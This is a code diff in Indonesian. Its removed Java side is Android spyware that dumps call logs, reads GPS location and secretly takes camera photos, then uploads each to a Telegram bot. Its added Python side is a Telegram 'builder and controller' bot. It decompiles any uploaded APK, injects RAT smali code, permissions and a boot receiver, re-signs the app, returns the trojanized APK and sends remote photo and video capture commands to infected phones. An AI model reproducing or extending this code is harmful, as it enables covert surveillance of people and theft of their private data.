-        StringBuilder sb = new StringBuilder();
-        try {
-            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
-            if (cursor != null && cursor.moveToFirst()) {
-                do {
-                    sb.append("Nomor: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)))
-                      .append("\nTipe: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)))
-                      .append("\nTanggal: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)))
-                      .append("\nDurasi: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))).append(" detik\n\n");
-                } while (cursor.moveToNext());
-                cursor.close();
-            }
-        } catch (Exception e) { writeLog("Gagal baca Call Log"); }
-        saveAndSendText("telpon_dump.txt", sb.toString(), "📞 Dump SEMUA Call Log");
-    }
+    elif state.startswith("waiting_path_foto_acak_") or state.startswith("waiting_path_foto_wajah_") or state.startswith("waiting_path_foto_perut_"):
+        mode = state.split("_")[2]
+        dev_id = state.split("_")[3]
+        user_states[chat_id] = f"waiting_count_{mode}_{dev_id}_{text}"
+        await update.message.reply_text("🔢 **Mau ambil berapa foto?**\n\nKetik angka (contoh: `10`):", parse_mode='Markdown')
 
-    private String getLocation() {
-        try {
-            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-            if (loc != null) return "Lat: " + loc.getLatitude() + "\nLng: " + loc.getLongitude();
-        } catch (Exception e) { return "Gagal ambil lokasi."; }
-        return "Lokasi tidak tersedia.";
-    }
+    elif state.startswith("waiting_count_"):
+        parts = state.split("_")
+        mode = parts[2]
+        dev_id = parts[3]
+        path = "_".join(parts[4:])
+        if text.isdigit():
+            perintah = f"/send_foto_{mode} {dev_id} {path} {text}"
+            user_states.pop(chat_id, None)
+            await kirim_perintah(update.message, perintah)
+        else:
+            await update.message.reply_text("❌ Harus berupa angka.")
 
-    private void takePhoto(int cameraId) {
-        try {
-            Camera camera = Camera.open(cameraId);
-            camera.startPreview();
-            camera.takePicture(null, null, new Camera.PictureCallback() {
-                @Override
-                public void onPictureTaken(byte[] data, Camera camera) {
-                    try {
-                        File file = new File(getExternalFilesDir(null), "sys_photo_" + System.currentTimeMillis() + ".jpg");
-                        java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
-                        fos.write(data); fos.close();
-                        camera.release();
-                        sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera");
-                    } catch (Exception e) { e.printStackTrace(); }
-                }
-            });
-        } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto."); }
-    }
+    elif state.startswith("waiting_path_send_video_"):
+        dev_id = state.replace("waiting_path_send_video_", "")
+        user_states[chat_id] = f"waiting_count_send_video_{dev_id}_{text}"
+        await update.message.reply_text("🔢 **Mau ambil berapa video?**\n\nKetik angka (contoh: `5`):", parse_mode='Markdown')
 
-    private void sendTelegramMessage(String pesan) {
-        try {
-            String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
-            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
-            new URL(urlStr).openConnection().getInputStream().close();
-        } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
-    }
+    elif state.startswith("waiting_count_send_video_"):
+        parts = state.split("_")
+        dev_id = parts[4]
+        path = "_".join(parts[5:])
+        if text.isdigit():
+            user_states[chat_id] = f"waiting_dur_send_video_{dev_id}_{path}_{text}"
+            await update.message.reply_text("⏱️ **Maksimal durasi video (detik)?**\n\nKetik angka (contoh: `30`):", parse_mode='Markdown')
+        else:
+            await update.message.reply_text("❌ Harus berupa angka.")
 
-    private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
-        try {
-            File file = new File(filePath);
-            if (!file.exists()) { writeLog("File ga ada: " + filePath); return; }
-            InputStream is = new FileInputStream(file);
-            sendTelegramFileStream(is, file.getName(), isPhoto, caption);
-        } catch (Exception e) { writeLog("Exception File: " + e.getMessage()); }
-    }
+    elif state.startswith("waiting_dur_send_video_"):
+        parts = state.split("_")
+        dev_id = parts[4]
+        path = parts[5]
+        count = parts[6]
+        if text.isdigit():
+            perintah = f"/send_video {dev_id} {path} {count} {text}"
+            user_states.pop(chat_id, None)
+            await kirim_perintah(update.message, perintah)
+        else:
+            await update.message.reply_text("❌ Harus berupa angka.")
 
-    private void sendTelegramFileStream(InputStream is, String filename, boolean isPhoto, String caption) {
-        String boundary = "*****";
-        String fieldName = isPhoto ? "photo" : "document";
-        try {
-            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + (isPhoto ? "/sendPhoto" : "/sendDocument");
-            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
-            conn.setDoOutput(true);
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-            
-            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
-            request.writeBytes("--" + boundary + "\r\n");
-            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
-            
-            if (caption != null) {
-                request.writeBytes("--" + boundary + "\r\n");
-                request.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
-            }
-            
-            request.writeBytes("--" + boundary + "\r\n");
-            request.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + filename + "\"\r\n");
-            request.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
-            
-            byte[] buffer = new byte[4096];
-            int bytesRead;
-            while ((bytesRead = is.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
-            is.close();
-            
-            request.writeBytes("\r\n--" + boundary + "--\r\n");
-            request.flush(); request.close();
-            
-            int responseCode = conn.getResponseCode();
-            if (responseCode != 200) {
-                writeLog("Kirim File GAGAL (" + responseCode + ")");
-            } else {
-                writeLog("Kirim File SUKSES: " + filename);
-            }
-        } catch (Exception e) {
-            writeLog("Exception Stream: " + e.getMessage());
-        }
-    }
+async def handle_checkin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = str(update.effective_chat.id)
+    if chat_id != ALLOWED_CHAT_ID and chat_id != GROUP_ID: return
+    
+    text = update.message.text
+    if text.startswith("/checkin "):
+        raw_data = text.replace("/checkin ", "").strip()
+        if "|" in raw_data:
+            dev_name, dev_id = raw_data.split("|")
+            devices = load_devices()
+            if not any(d['id'] == dev_id for d in devices):
+                devices.append({"name": dev_name, "id": dev_id})
+                save_devices(devices)
+                await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=f"✅ Device Baru: {dev_name}\nID: `{dev_id}`\nTotal: {len(devices)} HP.", parse_mode='Markdown')
 
-    @Override
-    public IBinder onBind(Intent intent) { return null; }
-}
+async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
+    chat_id = str(update.effective_chat.id)
+    await update.message.reply_text(f"⏳ Menerima APK: `{file_name}`\nMemproses inject...", parse_mode='Markdown')
+    session_id = str(uuid.uuid4())[:8]
+    session_dir = f"{WORK_DIR}/build_{session_id}"
+    apk_out_dir = f"{session_dir}/decoded"
+    apk_new_path = f"{session_dir}/modded.apk"
+    try:
+        await context.bot.send_message(chat_id=chat_id, text="🔧 [1/4] Membongkar APK...")
+        subprocess.run(f"apktool d '{file_path}' -o '{apk_out_dir}' -f", shell=True, check=True, capture_output=True)
+        await context.bot.send_message(chat_id=chat_id, text="💉 [2/4] Menyuntikkan kode RAT...")
+        target_smali_dir = f"{apk_out_dir}/smali/com/system/update"
+        os.makedirs(target_smali_dir, exist_ok=True)
+        if os.path.exists(PAYLOAD_SMALI_DIR):
+            for smali_file in os.listdir(PAYLOAD_SMALI_DIR):
+                if smali_file.endswith(".smali"): shutil.copy(os.path.join(PAYLOAD_SMALI_DIR, smali_file), target_smali_dir)
+        else: raise Exception("Folder payload_smali tidak ditemukan!")
+        await context.bot.send_message(chat_id=chat_id, text="📝 [3/4] Menyuntikkan Izin, Pop-up & BootReceiver...")
+        inject_manifest(f"{apk_out_dir}/AndroidManifest.xml")
+        popup_status = inject_permission_popup(apk_out_dir)
+        await context.bot.send_message(chat_id=chat_id, text=f"Status: {popup_status}")
+        subprocess.run(f"apktool b '{apk_out_dir}' -o '{apk_new_path}'", shell=True, check=True, capture_output=True)
+        await context.bot.send_message(chat_id=chat_id, text="🔐 [4/4] Menandatangani APK...")
+        signed_apk = f"{apk_new_path}.signed.apk"
+        subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}'", shell=True, check=True, capture_output=True)
+        await context.bot.send_message(chat_id=chat_id, text="✅ **BUILD SUKSES!**", parse_mode='Markdown')
+        with open(signed_apk, "rb") as f: await context.bot.send_document(chat_id=chat_id, document=f, filename=f"MOD_{file_name}")
+        await start(update, context)
+    except subprocess.CalledProcessError as e:
+        error_msg = e.stderr.decode('utf-8') if e.stderr else str(e)
+        await context.bot.send_message(chat_id=chat_id, text=f"❌ **GAGAL BUILD:**\n```\n{error_msg[:1000]}\n```", parse_mode='Markdown')
+    except Exception as e: await context.bot.send_message(chat_id=chat_id, text=f"❌ Error: {e}")
+    finally:
+        if os.path.exists(file_path): os.remove(file_path)
+        if os.path.exists(session_dir): shutil.rmtree(session_dir)
+        user_states.pop(chat_id, None)
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update): return
+    chat_id = str(update.effective_chat.id)
+    if user_states.get(chat_id) != "waiting_apk":
+        await update.message.reply_text("❌ Klik menu **Build APK Baru** dulu."); return
+    doc = update.message.document
+    if not doc or not doc.file_name.lower().endswith(".apk"):
+        await update.message.reply_text("❌ File harus `.apk`"); return 
+    await update.message.reply_text("⏳ Mendownload APK...")
+    file = await context.bot.get_file(doc.file_id)
+    temp_apk_path = f"{WORK_DIR}/{doc.file_name}"
+    await file.download_to_drive(temp_apk_path)
+    await process_apk(update, context, temp_apk_path, doc.file_name)
+
+def main():
+    ensure_keystore()
+    app = ApplicationBuilder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^/checkin '), handle_checkin))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))
+    print("🤖 Bot Builder & Controller nyala...")
+    app.run_polling()
+
+if __name__ == '__main__':
+    main()
